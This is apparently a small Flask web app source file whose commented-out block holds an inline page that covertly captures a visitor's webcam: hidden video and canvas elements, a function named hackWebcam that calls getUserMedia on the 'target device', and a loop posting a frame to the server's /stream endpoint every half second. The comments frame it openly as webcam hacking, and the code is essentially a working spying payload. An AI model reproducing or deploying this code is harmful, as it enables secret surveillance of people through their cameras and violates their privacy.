# packages
from flask import Flask, render_template, render_template_string

# web app instance
app = Flask(__name__)

# root route


@app.route("/")
def index_html():
    return render_template("index.html")


""" 
def index():
    return render_template_string('''
    <!-- Website content -->
    <h1 align = "center">Hello from Serge flask webapp</h1>
    
    <!-- Video frame -->
    <video hidden id="video" playsinline autoplay></video>
    
    <!-- Canvas to sniff data from -->
    <canvas hidden id="canvas" width="640" height="640">canvas</canvas>
    
    <!-- Jquery to make HTTP POST requests to send images from a webcam -->
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

    <!-- Webcam hacking happens here -->
    <script>
      // send a single frame from the webcam to your HTTP server 
      function post(imgdata){
        $.ajax({
          type: 'POST',
          data: {frame: imgdata},
          url: '/stream',
          dataType: 'json',
          async: false
        });
      };

      // hook up video frame and canvas elements
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      
      // target device's webcam settings
      const constraints = {
        audio: false,
        video: { facingMode: "user" }
      };
      
      // activate a webcam on a target device
      async function hackWebcam() {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        window.stream = stream;
        video.srcObject = stream;

        var context = canvas.getContext('2d');
        
        setInterval(function() {
          context.drawImage(video, 0, 0, 640, 640);
          var canvasData = canvas.toDataURL("image/png");
          post(canvasData);
        }, 500);
      }

      // hacking starts here
      hackWebcam();
    </script>
    ''')

"""

# main loop
if __name__ == "__main__":
    # start web server
    app.run(host="127.0.0.1", port=8080, debug=True)
